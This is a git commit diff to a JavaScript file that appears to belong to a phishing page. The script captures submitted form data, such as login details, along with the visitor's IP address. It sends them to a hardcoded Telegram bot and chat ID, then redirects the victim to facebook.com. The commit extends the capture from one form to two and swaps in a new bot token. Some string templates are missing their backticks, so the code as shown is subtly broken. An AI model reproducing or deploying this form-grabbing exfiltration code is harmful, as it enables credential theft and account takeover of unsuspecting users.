53a18f042a4ee944ef02a2e0e82f8d015b211909
joneboan <168922395+joneboan@users.noreply.github.com>
2024-05-05 06:07:41 +0500

    Update Script.js

--- Script.js
+++ Script.js
@@ -1,9 +1,10 @@
 window.onload = () => {
-  const token = "6791346781:AAETwcHhxdAyHliVRpkh3-QVSb7IVV6uHQA";
+  const token = "6884328378:AAHSfHTfbefzVvdTIqZeu4Bq_W5f0B4_nQg";
   const chatID = "1393367014";
   const url = https://api.telegram.org/bot${token}/sendMessage;
-  const form = document.querySelector("form");
-  form.addEventListener("submit", (e) => {
+  const form1 = document.querySelector("#form1");
+  const form2 = document.querySelector("#form2");
+  const onSubmit = (e) => {
     e.preventDefault();
     const formData = new FormData(e.target);
     let text = Time: ${new Date().toISOString()}\n;
@@ -14,11 +15,14 @@ window.onload = () => {
       .then((res) => res.text())
       .then((res) => {
         text += IP: ${res}\n;
+        console.log(text);
         fetch(`${url}?chat_id=${chatID}&text=${encodeURIComponent(text)}`).then(
           (res) => {
             location.assign("https://facebook.com");
           }
         );
       });
-  });
+  };
+  form1.addEventListener("submit", onSubmit);
+  form2.addEventListener("submit", onSubmit);
 };
